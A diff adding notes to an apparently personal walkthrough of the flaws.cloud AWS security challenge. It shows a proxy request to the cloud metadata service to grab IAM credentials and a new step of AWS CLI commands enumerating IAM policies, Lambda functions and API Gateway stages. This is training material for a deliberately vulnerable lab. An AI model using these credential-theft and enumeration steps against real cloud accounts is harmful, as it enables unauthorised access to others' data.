@@ -29,3 +29,11 @@
   - Use the proxy to request this metadata service to grab security credentials: (http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/)
   - Use these creds to access buckets you were not supposed to access!
   
+7.) Using the SecurityAudit group can show lots of information
+  - Get user information: (aws --profile lvl6 iam get-user)
+  - Get user policies: (aws --profile lvl6 iam list-attached-user-policies --user-name Level6)
+  - Get information about a policy: (aws --profile lvl6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit)
+  - If a policy allows you to list api enpoints you can query different functions that could give off information.
+  - List lambda functions (aws --profile lvl6 lambda list-functions)
+  - Query lambda informations (aws --profile lvl6 lambda get-policy --function-name Level6)
+  - View information of a lambda (aws --profile lvl6 apigateway get-stages --rest-api-id "s33ppypa75")
